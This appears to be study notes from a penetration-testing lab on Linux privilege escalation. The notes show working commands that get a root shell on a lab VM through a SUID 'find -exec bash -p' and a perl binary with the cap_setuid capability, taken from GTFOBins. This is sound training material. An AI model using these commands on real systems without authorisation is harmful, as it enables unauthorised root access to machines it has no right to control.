Questions 1
Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which utility can we use to manually search for misconfigured capabilities?

ssh joe@192.168.233.214

# TO better understanding of this concept lets work on the demo below
passwd

# Leave it there as not to input the password

# Open another shell by ssh 
ps u -C passwd
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1808  0.0  0.1   9364  3056 pts/0    S+   09:19   0:00 passwd

# Interestingly, passwd is running as the root USER; this is needed for it to access and modify /etc/passwd

# We can also inspect the real UID and effective UID assigned for the process by inspecting the proc pseudo-filesystem, which allows us to interact with kernel information. Using the passwd's PID (1808) from the previous output, let's inspect the content at /proc/1932/status, which provides a summary of the process attributes:
grep Uid /proc/1808/status
Uid:    1000    0       0       0

# The passwd binary behaves differently because the binary program has a special flag named Set-User-ID, or SUID in short. Let's inspect it:
ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd

# The SUID flag is depicted with the s flag in the above output. This flag can be configured using the chmod u+s <filename> command, and it sets the effective UID of the running process to the executable owner's user ID - in this case root's.

# Using this technique results in a legitimate and constrained privilege escalation and because of this the SUID binary must be bug-free to avoid any misuse of the application.

# We can quickly abuse this vulnerability by running the find program to search any well-known file, like our own Desktop folder. Once the file is found, we can instruct find to perform any action through the -exec parameter. In this case, we want to execute a bash shell along with the Set Builtin1 -p parameter that is preventing the effective user from being reset.

find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)

# After running the command, we've obtained a root shell and we'll observe that although the UID still belongs to joe, the effective user ID is from root.

# Another set of features subject to privilege escalation techniques are Linux capabilities

# Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules. Similarly to setuid binaries, if misconfigured, these capabilities could allow an attacker to elevate their privileges to root.

# To demonstrate these risks, let's try to manually enumerate our target system for binaries with capabilities. We are going to run getcap with the -r parameter to perform a recursive search starting from the root folder /, filtering out any errors from the terminal output.

/usr/sbin/getcap -r / 2>/dev/null
...
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
...

# The two perl binaries stand out as they have setuid capabilities enabled, along with the +ep flag specifying that these capabilities are effective and permitted.

# In order to exploit this capability misconfiguration, we could check the GTFOBins3 website. This site provides an organized list of UNIX binaries and how can they be misused to elevate our privileges.

# Searching for "Perl" on the GTFOBins website, we'll find precise instructions for which command to use to exploit capabilities. We'll use the whole command, which executes a shell along with a few POSIX directives enabling setuid.
https://gtfobins.github.io/

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Now we get the root shell
whoami
root